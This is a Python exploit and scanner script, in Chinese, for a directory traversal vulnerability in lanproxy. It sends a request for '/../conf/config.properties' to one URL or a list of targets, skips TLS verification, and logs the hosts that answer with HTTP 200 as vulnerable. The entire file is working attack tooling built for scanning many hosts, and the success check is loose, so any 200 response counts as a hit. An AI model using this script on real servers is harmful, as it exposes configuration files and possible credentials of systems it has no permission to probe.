import requests
import argparse
import urllib3
import sys

urllib3.disable_warnings()


def title():
    print("""
                        lanproxy目录遍历漏洞
                use: python3  lanproxy目录遍历漏洞.py
                        Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.get(self.url + "/../conf/config.properties", verify=False)
            # if 'server.bind' in web.text and web.status_code == 200:
            if web.status_code == 200:
                print("\033[36m[o] 目标 {} 存在lanproxy目录遍历漏洞 \033[0m".format(self.url))
                with open("lanproxy目录遍历漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            else:
                print("\033[31m[x] 目标 {} 不存在lanproxy目录遍历漏洞 \033[0m".format(self.url))
        except requests.exceptions.ConnectionError:
            print("链接错误")
            pass


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="lanproxy目录遍历漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 lanproxy目录遍历漏洞.py -u http://127.0.0.1\neg2:>>>python3 lanproxy目录遍历漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
